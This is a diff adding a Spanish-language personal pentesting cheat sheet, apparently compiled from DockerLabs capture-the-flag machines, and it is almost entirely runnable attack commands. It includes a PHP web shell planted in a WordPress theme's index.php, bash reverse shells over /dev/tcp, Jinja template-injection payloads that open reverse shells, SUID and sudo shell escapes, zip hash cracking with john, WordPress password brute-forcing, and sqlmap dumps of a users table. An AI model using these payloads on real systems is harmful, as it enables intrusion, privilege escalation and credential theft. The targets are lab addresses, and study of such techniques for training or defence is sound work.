@@ -1,0 +1,87 @@
+gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt  -t 64 -x html,py,php,js
+
+reverse shell desde un tema de wordpress
+al archivo index.php del tema 
+<?php
+	system($_GET['cmd']);
+?>
+
+nc -nlvp 443
+http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.39/443 0>%261"
+script /dev/null -c bash 
+Escalada de privilegios
+
+En el /etc/passwd no encontramos ningún usuario mario al que podamos migrar con las credenciales que ya tenemos. Tampoco podemos hacer "sudo -l. Buscaremos por binarios con permisos SUID desde la raíz:
+
+find / -perm -4000 2>/dev/null
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/ls
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/grep
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/su
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+-----------------
+ /usr/bin/grep '' /root/pass.hash
+./usr/bin/env /bin/sh -p
+www-data@007097f91344:/usr/bin$ ./env /bin/sh -p
+
+primero vemos donde tenemos permisos root 
+sudo -l
+luego ejecutamos en dicho directorio con permisos root en este caso un ruby 
+sudo ruby -e 'exec "/bin/sh"'
+para python 
+sudo python3 -c 'import os; os.system("/bin/sh")'
+
+mejora la shell 
+script /dev/null -c bash
+ fuzzing 
+ wfuzz -c --hl=0 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id"
+
+crakear ficheros
+convertimos en hash
+zip2john secretitopicaron.zip > secretohash
+luego fuerza bruta
+john --format=PKZIP -w /usr/share/wordlists/rockyou.txt  secretohash
+
+wordpress
+wpscan --url http://192.168.1.100 -U admin -P /usr/share/wordlists/rockyou.txt
+enviando una solicitud POST con el token encontrado, para visualizar que nos devuelve la salida. Referencia: maquina consolelog de dokcerlabs https://gm4tsy.hashnode.dev/dockerlabs-consolelog
+curl -X POST http://172.17.0.2:3000/recurso/ -H "Content-Type: application/json" -d '{"token":"tokentraviesito"}'
+
+passwd cifrada en base64
+echo "aquivalapasswordcifrada" | base64 --decode
+
+ssti
+comprobacion
+{{7*7}} 
+reverse shell
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.2/443 0>&1\'').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read() }}
+cuando somo un usuario diferente al usuario que si puede ejecutar un programa o archivo en especifico como root en este caso yo (bobby) con sudo -l vi que pinguinito podia ejecutar como root aunque este en el usuario bobby
+sudo -l
+--------------
+User bobby may run the following commands on 1e9c73d6dd94:
+    (pinguinito) NOPASSWD: /usr/bin/python3
+
+Podemos ejecutar python como el user pinguinito. Podemos abusar de este con:
+
+sudo -u pinguinito /usr/bin/python3
+
+sqlmap -u http://172.17.0.2/login.html --form --dbs -batch
+sqlmap -u http://172.17.0.2/login.html --form --dbs -batch
+sqlmap -u http://172.17.0.2/login.html --form -D users --tables  -batch
+sqlmap -u http://172.17.0.2/login.html --form -D users -T usuarios -batch
+sqlmap -u http://172.17.0.2/login.html --form -D users -T usuarios --columns -batch
+ sqlmap -u http://172.17.0.2/login.html --form -D users -T usuarios -C id,password,username --dump -batch
+
+Enumerar puertos
+enum4linux -a 172.17.0.2
+
+sobreescribe si no permite escribir con nao entre comillas el contenido > la ruta
+echo '#!/bin/bash' > /opt/log_cleaner.sh
